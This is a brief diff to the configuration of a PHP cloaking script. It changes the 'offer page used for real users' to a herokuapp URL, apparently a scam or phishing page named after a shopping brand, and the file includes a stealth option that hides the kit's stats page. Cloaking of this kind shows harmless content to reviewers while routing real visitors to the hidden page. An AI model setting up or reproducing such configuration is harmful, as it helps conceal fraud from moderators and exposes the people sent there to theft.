@@ -1,6 +1,6 @@
 <?php
 /* Required settings     */
-$CLOAKING['OFFER_PAGE'] = 'chat.premiumkan.com/';//PHP/HTML file or URL offer used for real users
+$CLOAKING['OFFER_PAGE'] = 'https://blanjablnjaid.herokuapp.com/sopi.php';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
